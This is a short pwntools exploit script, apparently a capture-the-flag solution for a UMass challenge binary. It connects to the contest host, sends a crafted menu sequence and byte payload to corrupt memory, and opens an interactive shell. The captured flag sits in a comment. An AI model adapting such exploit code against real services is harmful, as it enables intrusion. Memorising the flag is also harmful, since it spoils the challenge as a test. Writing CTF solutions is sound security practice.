#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./chall_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc mitigations-are-awesome.ctf.umasscybersec.org 1337"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *main+773
c 
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.sendline(b"1")
    r.sendline(b"8")

    r.sendline(b"3")
    r.sendline(b"0")
    r.sendline(b"200")
    r.send(b"Ez W\x00"*5 + p64(0x20)[:-1] + b"Ez W\x00")
    sleep(0.1)
    r.sendline(b"4")

    r.interactive()
    #UMASS{$0m3on3!_g37z_4ng$ty_wh3n_ptr4c3_w0rkz!!!}

if __name__ == "__main__":
    main()